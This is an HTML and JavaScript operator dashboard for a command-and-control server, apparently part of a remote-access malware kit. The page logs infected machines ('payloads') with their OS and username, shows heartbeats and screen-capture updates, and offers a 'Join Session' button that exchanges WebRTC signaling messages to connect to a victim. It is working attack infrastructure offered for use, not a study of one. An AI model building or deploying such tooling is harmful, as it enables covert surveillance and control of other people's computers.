<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>C2 Command Center</title>
    <style>
        body { background: #0f172a; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; margin: 0; }
        h1 { margin-top: 0; font-size: 24px; border-bottom: 1px solid #334155; padding-bottom: 10px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-bottom: 20px; }
        .card { background: #1e293b; padding: 15px; border-radius: 8px; border: 1px solid #334155; transition: transform 0.2s; }
        .card:hover { transform: translateY(-2px); border-color: #3b82f6; }
        .btn { background: #3b82f6; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; border-radius: 4px; }
        .btn:hover { background: #2563eb; }

        /* Logs Container */
        #logs-container { height: 300px; overflow-y: auto; background: #000; padding: 10px; font-size: 12px; color: #ccc; border: 1px solid #334155; border-radius: 8px; }
        .log-entry { margin-bottom: 4px; border-bottom: 1px solid #1e293b; padding-bottom: 2px; }
        .log-time { color: #64748b; margin-right: 8px; }
        .log-alert-green { color: #4ade80; }
        .log-alert-red { color: #f87171; }
        .log-alert-blue { color: #60a5fa; }
        .log-alert-white { color: #e2e8f0; }

        /* Status Indicators */
        .status-dot { height: 10px; width: 10px; background-color: #4ade80; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .empty-state { text-align: center; color: #64748b; margin-top: 50px; font-style: italic; }
    </style>
</head>
<body>
    <h1>🛡️ C2 Command Center</h1>

    <!-- User Grid -->
    <div class="grid" id="userGrid"></div>
    <div id="emptyState" class="empty-state">Waiting for connections...</div>

    <!-- Live Logs -->
    <h3>Live Event Log</h3>
    <div id="logs-container"></div>

    <script>
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const host = window.location.host;
        const wsUrl = `${protocol}//${host}/`;

        const ws = new WebSocket(wsUrl);
        let users = {};
        let isConnected = false;

        ws.onopen = () => {
            console.log("Admin connected to C2");
            // Register as admin immediately
            ws.send(JSON.stringify({ type: 'register_admin' }));
            addLog("Connected to C2 Server", "blue");
        };

        ws.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);

                if (data.type === 'registered') {
                    ws.isAdmin = true;
                    addLog("Admin Session Registered", "blue");
                }
                else if (data.type === 'alert') {
                    // Standard alert messages (New User, Disconnect)
                    addLog(data.message, data.message.includes('🟢') ? 'green' : 'red');
                }
                else if (data.type === 'info') {
                    // Handle info packets from payload
                    addLog(`🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`, 'green');

                    // Add to grid
                    if (!users[data.id]) {
                        users[data.id] = { status: 'Online', logs: [], info: data, lastSeen: Date.now() };
                    } else {
                        // Update existing user info
                        users[data.id].status = 'Online';
                        users[data.id].info = data;
                        users[data.id].lastSeen = Date.now();
                    }
                    renderUsers();
                }
                else if (data.type === 'heartbeat') {
                    // Keep user alive in the UI
                    if (users[data.id]) {
                        users[data.id].lastSeen = Date.now();
                        users[data.id].status = 'Online';
                        renderUsers(); 
                    }
                }
                else if (data.type === 'system') {
                    addLog(data.message, 'blue');
                }
                else if (data.type === 'screen_data') {
                    // Log screen updates
                    addLog(`📺 Screen update from ${data.id}`, 'blue');

                    // Ensure user exists in grid even if they didn't send 'info' first
                    if (!users[data.id]) {
                        users[data.id] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
                    }
                    users[data.id].lastSeen = Date.now();
                    renderUsers();
                }
                else if (data.type === 'system_log') {
                    // Display raw server logs in the admin panel
                    addLog(data.message, 'white');
                }
                else if (data.type === 'join_request') {
                    // Payload is requesting to join us (or we requested it)
                    addLog(`[JOIN] Join request from ${data.from}`, 'blue');
                    
                    // If this is a response to our request, we need to handle the offer
                    // But usually, the payload will send an 'offer' after receiving 'join_request'
                }
                else if (data.type === 'offer') {
                    // Payload sent an offer to us
                    addLog(`[SIG] Received Offer from ${data.from}`, 'green');
                    
                    // Store the offer in the user's object
                    if (!users[data.from]) {
                        users[data.from] = { status: 'Connecting...', logs: [], info: {}, lastSeen: Date.now() };
                    }
                    users[data.from].signalingData = data;
                    renderUsers();
                    
                    // Automatically send answer if you want instant connection, 
                    // or wait for user to click join again. Let's wait for explicit action.
                }
                else if (data.type === 'answer') {
                    // Payload answered our offer
                    addLog(`[SIG] Received Answer from ${data.from}`, 'green');
                    if (users[data.from]) {
                        users[data.from].status = 'Connected';
                        renderUsers();
                    }
                }
                else if (data.type === 'candidate') {
                    // ICE Candidate exchange
                    if (users[data.from]) {
                        users[data.from].iceCandidate = data.candidate;
                    }
                }
                else {
                    // Generic fallback for other types (offer, answer, candidate)
                    if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'info' && data.type !== 'screen_data' && data.type !== 'heartbeat') {
                        addLog(`[${data.targetId || data.from || data.id}] Received: ${data.type}`, 'blue');

                        // Ensure user exists in grid
                        const userId = data.targetId || data.from || data.id;
                        if (!users[userId]) {
                            users[userId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
                        }
                        users[userId].logs.push(data.type);
                        users[userId].lastSeen = Date.now();
                        renderUsers();
                    }
                }
            } catch (e) {
                console.error("Error parsing message:", e);
            }
        };

        function addLog(msg, colorClass = '') {
            const logContainer = document.getElementById('logs-container');
            const div = document.createElement('div');
            div.className = `log-entry log-alert-${colorClass}`;

            const timeSpan = document.createElement('span');
            timeSpan.className = 'log-time';
            timeSpan.innerText = new Date().toLocaleTimeString();

            const msgSpan = document.createElement('span');
            msgSpan.innerText = msg;

            div.appendChild(timeSpan);
            div.appendChild(msgSpan);

            logContainer.prepend(div);

            // Keep log size manageable
            if (logContainer.children.length > 100) {
                logContainer.removeChild(logContainer.lastChild);
            }
        }

        function renderUsers() {
            const grid = document.getElementById('userGrid');
            const emptyState = document.getElementById('emptyState');

            // Clear current grid
            grid.innerHTML = '';

            const userCount = Object.keys(users).length;

            if (userCount === 0) {
                emptyState.style.display = 'block';
                return;
            } else {
                emptyState.style.display = 'none';
            }

            for (const [id, data] of Object.entries(users)) {
                const card = document.createElement('div');
                card.className = 'card';

                const osInfo = data.info ? `${data.info.os} / ${data.info.user}` : 'Unknown OS';
                const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
                const statusColor = data.status === 'Connected' ? '#4ade80' : (data.status === 'Connecting...' ? '#fbbf24' : '#4ade80');

                card.innerHTML = `
                    <strong>User ID: ${id}</strong><br>
                    <span class="status-dot" style="background-color: ${statusColor}"></span> Info: ${osInfo}<br>
                    Last Seen: ${lastSeen}<br>
                    <button class="btn" onclick="joinUser('${id}')">Join Session</button>
                `;
                grid.appendChild(card);
            }
        }

        function joinUser(id) {
            // Check if we already have an offer from the payload
            if (users[id] && users[id].signalingData) {
                // Send the answer back to the payload
                const offer = users[id].signalingData;
                ws.send(JSON.stringify({
                    type: 'answer',
                    targetId: id,
                    sdp: { // Dummy SDP for now, replace with real RTCPeerConnection logic
                        type: 'answer',
                        sdp: 'v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\n'
                    }
                }));
                addLog(`[ADMIN] Sent Answer to ${id}`, 'green');
                users[id].status = 'Connected';
                renderUsers();
            } else {
                // Request an offer from the payload
                ws.send(JSON.stringify({
                    type: 'request_join',
                    targetId: id,
                    from: null 
                }));
                addLog(`[ADMIN] Requested Join to ${id}`, 'blue');
                
                // Update UI to show connecting
                if (users[id]) {
                    users[id].status = 'Connecting...';
                    renderUsers();
                }
            }
            
            // Visual feedback
            const button = document.querySelector(`button[onclick="joinUser('${id}')"]`);
            if (button) {
                button.parentElement.style.borderColor = '#4ade80';
                setTimeout(() => button.parentElement.style.borderColor = '#3b82f6', 500);
            }
        }
    </script>
</body>
</html>
